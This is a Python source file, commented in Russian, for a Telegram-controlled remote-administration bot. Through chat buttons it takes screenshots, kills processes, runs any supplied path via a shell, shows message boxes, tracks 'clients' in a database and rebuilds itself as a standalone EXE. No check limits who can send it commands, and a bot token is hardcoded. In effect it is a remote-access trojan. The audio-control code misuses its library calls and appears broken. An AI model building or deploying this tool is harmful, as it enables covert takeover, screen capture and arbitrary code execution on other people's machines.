# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import platform
import psutil
import io
import sqlite3
import datetime
import shutil
import asyncio
import ctypes
from PIL import ImageGrab
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ---------- Проверка наличия DISPLAY (для Linux) ----------
def has_display():
    return 'DISPLAY' in os.environ

# ---------- Функция создания всплывающего окна (msgbox) ----------
def show_msgbox(title, message, style=0):
    """
    Создаёт всплывающее окно на целевой машине.
    style: 0 = OK, 1 = OK/Cancel, 2 = Abort/Retry/Ignore, 3 = Yes/No/Cancel, 4 = Yes/No, 5 = Retry/Cancel
    Возвращает код нажатой кнопки (на Windows) или строку.
    """
    if platform.system() == 'Windows':
        try:
            # Используем MessageBoxW из user32
            MB_OK = 0
            MB_OKCANCEL = 1
            MB_ABORTRETRYIGNORE = 2
            MB_YESNOCANCEL = 3
            MB_YESNO = 4
            MB_RETRYCANCEL = 5
            styles = [MB_OK, MB_OKCANCEL, MB_ABORTRETRYIGNORE, MB_YESNOCANCEL, MB_YESNO, MB_RETRYCANCEL]
            style = styles[style] if 0 <= style < len(styles) else MB_OK
            result = ctypes.windll.user32.MessageBoxW(0, message, title, style)
            return f"Окно показано. Результат: {result}"
        except Exception as e:
            return f"Ошибка при создании окна: {e}"
    elif platform.system() == 'Linux':
        # Пробуем zenity (если установлен)
        try:
            cmd = ['zenity', '--info', '--title', title, '--text', message]
            subprocess.run(cmd, check=True, timeout=5)
            return "Окно показано через zenity."
        except FileNotFoundError:
            return "Для Linux установите zenity (sudo apt install zenity) или используйте Windows."
        except Exception as e:
            return f"Ошибка: {e}"
    else:
        return "Msgbox поддерживается только на Windows и Linux (с zenity)."

# ---------- Функции скриншота (с проверкой DISPLAY) ----------
def get_screenshot():
    if not has_display():
        return None
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf.read()
    except Exception:
        return None

# ---------- Управление звуком (только Windows) ----------
def set_volume(level):
    if platform.system() != 'Windows':
        return "Управление звуком доступно только на Windows"
    try:
        import comtypes
        from comtypes import CLSCTX_ALL
        from ctypes import cast, POINTER
        from comtypes.gen import MMDeviceAPI, IID_IAudioEndpointVolume
        dev = comtypes.client.CreateObject(MMDeviceAPI.MMDeviceEnumerator, interface=MMDeviceAPI.IMMDeviceEnumerator)
        dev.GetDefaultAudioEndpoint(0, 1, ctypes.byref(dev))
        endpoint = cast(dev, POINTER(MMDeviceAPI.IMMDevice))
        endpoint.Activate(IID_IAudioEndpointVolume, CLSCTX_ALL, None, ctypes.byref(endpoint))
        volume = cast(endpoint, POINTER(MMDeviceAPI.IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level, None)
        return f"Громкость установлена на {int(level*100)}%"
    except Exception as e:
        return f"Ошибка: {e}"

def mute(enable=True):
    if platform.system() != 'Windows':
        return "Управление звуком доступно только на Windows"
    try:
        import comtypes
        from comtypes import CLSCTX_ALL
        from ctypes import cast, POINTER
        from comtypes.gen import MMDeviceAPI, IID_IAudioEndpointVolume
        dev = comtypes.client.CreateObject(MMDeviceAPI.MMDeviceEnumerator, interface=MMDeviceAPI.IMMDeviceEnumerator)
        dev.GetDefaultAudioEndpoint(0, 1, ctypes.byref(dev))
        endpoint = cast(dev, POINTER(MMDeviceAPI.IMMDevice))
        endpoint.Activate(IID_IAudioEndpointVolume, CLSCTX_ALL, None, ctypes.byref(endpoint))
        volume = cast(endpoint, POINTER(MMDeviceAPI.IAudioEndpointVolume))
        volume.SetMute(enable, None)
        return "Звук выключен" if enable else "Звук включён"
    except Exception as e:
        return f"Ошибка: {e}"

def get_volume():
    if platform.system() != 'Windows':
        return None, None
    try:
        import comtypes
        from comtypes import CLSCTX_ALL
        from ctypes import cast, POINTER
        from comtypes.gen import MMDeviceAPI, IID_IAudioEndpointVolume
        dev = comtypes.client.CreateObject(MMDeviceAPI.MMDeviceEnumerator, interface=MMDeviceAPI.IMMDeviceEnumerator)
        dev.GetDefaultAudioEndpoint(0, 1, ctypes.byref(dev))
        endpoint = cast(dev, POINTER(MMDeviceAPI.IMMDevice))
        endpoint.Activate(IID_IAudioEndpointVolume, CLSCTX_ALL, None, ctypes.byref(endpoint))
        volume = cast(endpoint, POINTER(MMDeviceAPI.IAudioEndpointVolume))
        level = volume.GetMasterVolumeLevelScalar()
        muted = volume.GetMute()
        return level, muted
    except:
        return None, None

# ---------- Управление процессами ----------
def list_processes():
    procs = []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            procs.append((p.info['name'], p.info['pid']))
        except:
            pass
    return procs

def kill_process(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        return f"Процесс {pid} завершён"
    except Exception as e:
        return f"Ошибка: {e}"

def run_program(path):
    try:
        subprocess.Popen(path, shell=True)
        return f"Запущено: {path}"
    except Exception as e:
        return f"Ошибка: {e}"

def get_system_info():
    return {
        "os": platform.system() + " " + platform.release(),
        "node": platform.node(),
        "cpu": platform.processor() or "unknown",
        "cores": os.cpu_count(),
        "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
    }

# ---------- БАЗА ДАННЫХ ДЛЯ КЛИЕНТОВ ----------
DB_FILE = "clients.db"
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (client_id TEXT PRIMARY KEY, machine_name TEXT, last_seen TEXT, ip TEXT, os TEXT)''')
    conn.commit()
    conn.close()

def register_client(client_id, machine_name, ip, os_ver):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''REPLACE INTO clients (client_id, machine_name, last_seen, ip, os)
                 VALUES (?, ?, ?, ?, ?)''',
              (client_id, machine_name, datetime.datetime.now().isoformat(), ip, os_ver))
    conn.commit()
    conn.close()

def get_clients():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT client_id, machine_name, last_seen, ip, os FROM clients')
    rows = c.fetchall()
    conn.close()
    return rows

# ---------- СБОРКА EXE (только Windows) ----------
async def build_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if platform.system() != 'Windows':
        await update.message.reply_text("❌ Сборка EXE доступна только на Windows.")
        return
    await update.message.reply_text("🔨 Начинаю сборку EXE... Это может занять 2-5 минут.")
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)
    build_path = os.path.join(script_dir, "build_output")
    if os.path.exists(build_path):
        shutil.rmtree(build_path)
    os.makedirs(build_path, exist_ok=True)
    cmd = (
        f"pyinstaller --onefile --console --distpath {build_path} "
        f"--workpath {build_path}/build --specpath {build_path} {script_path}"
    )
    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=script_dir
        )
        stdout, stderr = await process.communicate()
        if process.returncode != 0:
            error_msg = stderr.decode('utf-8', errors='ignore')[:500]
            await update.message.reply_text(f"❌ Ошибка сборки:\n{error_msg}")
            return
        exe_name = os.path.splitext(os.path.basename(script_path))[0] + ".exe"
        exe_path = os.path.join(build_path, exe_name)
        if not os.path.exists(exe_path):
            await update.message.reply_text("❌ EXE не найден после сборки.")
            return
        with open(exe_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=exe_name,
                caption="✅ Готовый EXE-файл. Используйте только на своих машинах."
            )
        shutil.rmtree(build_path)
        await update.message.reply_text("🗑 Временные файлы удалены.")
    except FileNotFoundError:
        await update.message.reply_text("❌ PyInstaller не найден. Установите: pip install pyinstaller")
    except Exception as e:
        await update.message.reply_text(f"❌ Непредвиденная ошибка: {e}")

# ---------- ОБРАБОТЧИКИ КОМАНД ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    client_id = str(user.id)
    machine_name = platform.node()
    ip = str(update.effective_message.chat.id)
    os_ver = platform.system() + " " + platform.release()
    register_client(client_id, machine_name, f"chat_{ip}", os_ver)

    keyboard = [
        [InlineKeyboardButton("🖥 Скриншот", callback_data='screenshot')],
        [InlineKeyboardButton("📋 Процессы", callback_data='list_procs')],
        [InlineKeyboardButton("❌ Завершить процесс", callback_data='kill_proc')],
        [InlineKeyboardButton("🚀 Запустить программу", callback_data='run_prog')],
        [InlineKeyboardButton("ℹ️ Инфо о системе", callback_data='sysinfo')],
        [InlineKeyboardButton("📋 Список клиентов", callback_data='list_clients')],
        [InlineKeyboardButton("💬 MsgBox", callback_data='msgbox')],
        [InlineKeyboardButton("🔊 Громкость +", callback_data='vol_up'),
         InlineKeyboardButton("🔇 Mute", callback_data='mute'),
         InlineKeyboardButton("🔊 Громкость -", callback_data='vol_down')],
        [InlineKeyboardButton("🔨 Собрать EXE", callback_data='build_exe')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"✅ Бот активирован для {machine_name}\nВыберите действие:",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'screenshot':
        img_bytes = get_screenshot()
        if img_bytes is None:
            await query.edit_message_text("❌ Скриншот недоступен (нет графической среды).\nЗапустите бота на Windows или на Linux с X11.")
            return
        await query.edit_message_text("📸 Делаю скриншот...")
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=img_bytes)
        await query.delete_message()

    elif data == 'list_procs':
        procs = list_processes()
        text = "📋 Процессы (имя, PID):\n" + "\n".join([f"{name} ({pid})" for name, pid in procs[:20]])
        if len(procs) > 20:
            text += "\n... и ещё " + str(len(procs)-20)
        await query.edit_message_text(text)

    elif data == 'kill_proc':
        await query.edit_message_text("Введите PID процесса для завершения (число):")
        context.user_data['awaiting_pid'] = True

    elif data == 'run_prog':
        await query.edit_message_text("Введите полный путь к программе для запуска (например, C:\\Windows\\System32\\notepad.exe):")
        context.user_data['awaiting_path'] = True

    elif data == 'sysinfo':
        info = get_system_info()
        text = f"ℹ️ Система:\nOS: {info['os']}\nХост: {info['node']}\nCPU: {info['cpu']}\nЯдра: {info['cores']}\nRAM: {info['ram']}"
        await query.edit_message_text(text)

    elif data == 'list_clients':
        clients = get_clients()
        if not clients:
            await query.edit_message_text("Нет зарегистрированных клиентов.")
            return
        text = "📋 Зарегистрированные клиенты:\n"
        for cid, name, last, ip, os in clients:
            text += f"ID: {cid}, Имя: {name}, IP: {ip}, OS: {os}, Последний: {last[:16]}\n"
        await query.edit_message_text(text)

    elif data == 'msgbox':
        await query.edit_message_text("Введите заголовок и текст окна через '|' (например: Заголовок|Текст сообщения):")
        context.user_data['awaiting_msgbox'] = True

    elif data == 'build_exe':
        await build_exe(update, context)

    elif data in ('vol_up', 'vol_down', 'mute'):
        if platform.system() != 'Windows':
            await query.edit_message_text("❌ Управление звуком доступно только на Windows.")
            return
        if data == 'vol_up':
            level, _ = get_volume()
            if level is None:
                await query.edit_message_text("Не удалось определить громкость.")
                return
            res = set_volume(min(level + 0.1, 1.0))
        elif data == 'vol_down':
            level, _ = get_volume()
            if level is None:
                await query.edit_message_text("Не удалось определить громкость.")
                return
            res = set_volume(max(level - 0.1, 0.0))
        else:  # mute
            _, muted = get_volume()
            if muted is None:
                await query.edit_message_text("Не удалось определить состояние.")
                return
            res = mute(not muted)
        await query.edit_message_text(res)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()

    if context.user_data.get('awaiting_pid', False):
        try:
            pid = int(text)
            res = kill_process(pid)
            await update.message.reply_text(res)
        except ValueError:
            await update.message.reply_text("Введите корректное число (PID).")
        context.user_data['awaiting_pid'] = False
        return

    if context.user_data.get('awaiting_path', False):
        res = run_program(text)
        await update.message.reply_text(res)
        context.user_data['awaiting_path'] = False
        return

    if context.user_data.get('awaiting_msgbox', False):
        if '|' not in text:
            await update.message.reply_text("Используйте формат: Заголовок|Текст")
            return
        title, msg = text.split('|', 1)
        res = show_msgbox(title.strip(), msg.strip())
        await update.message.reply_text(res)
        context.user_data['awaiting_msgbox'] = False
        return

    # Если ничего не ожидалось — показываем меню
    await start(update, context)

# ---------- ЗАПУСК БОТА ----------
def main():
    TOKEN = "8451519620:AAGNpryYEiYzWIHyoZtz7GDmSJdwNXEXUkE"   # ОБЯЗАТЕЛЬНО ЗАМЕНИТЕ!
    init_db()
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Бот запущен. Нажмите Ctrl+C для остановки.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
